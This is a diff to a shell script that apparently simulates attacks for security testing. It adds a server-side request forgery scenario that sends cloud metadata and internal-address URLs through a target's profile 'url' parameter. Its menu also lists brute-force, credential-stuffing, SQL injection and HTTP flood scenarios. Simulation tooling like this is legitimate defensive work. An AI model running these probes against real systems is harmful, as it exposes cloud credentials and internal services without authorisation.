@@ -128,6 +128,21 @@ scenario_account_takeover() {
     green "[+] account_takeover complete"
 }
 
+scenario_ssrf() {
+    blue "[*] Scenario: ssrf — Server-Side Request Forgery & metadata probe"
+    PROBES=(
+        "http://169.254.169.254/latest/meta-data/"
+        "http://169.254.169.254/computeMetadata/v1/"
+        "http://127.0.0.1:8080/actuator/env"
+        "http://localhost:3000/rest/admin"
+    )
+    for probe in "${PROBES[@]}"; do
+        curl -s -o /dev/null -w "GET /profile?url=%{url_effective} -> %{http_code}
+"             "${TARGET}/profile?url=${probe}" || true
+    done
+    green "[+] ssrf complete"
+}
+
 scenario_full() {
     blue "[*] Running ALL core scenarios in sequence..."
     echo ""
@@ -150,6 +165,9 @@ scenario_full() {
     echo ""
     sleep 5
     scenario_credential_stuffing
+    echo ""
+    sleep 5
+    scenario_ssrf
     echo ""
     green "[+] All core scenarios complete."
 }
@@ -519,6 +537,7 @@ usage() {
     echo "  brute_force              Hydra login brute force"
     echo "  credential_stuffing      Fast multi-user credential spray"
     echo "  account_takeover         Successful login from high-risk geo IP"
+    echo "  ssrf                     Server-side request forgery: cloud metadata and internal-address probes"
     echo "  web_scan                 ffuf path/param fuzzing"
     echo "  sqli                     sqlmap SQL injection"
     echo "  http_flood               hey HTTP flood"
@@ -546,6 +565,7 @@ case "$1" in
     brute_force)              scenario_brute_force ;;
     credential_stuffing)      scenario_credential_stuffing ;;
     account_takeover)         scenario_account_takeover ;;
+    ssrf)                     scenario_ssrf ;;
     web_scan)                 scenario_web_scan ;;
     sqli)                     scenario_sqli ;;
     http_flood)               scenario_http_flood ;;
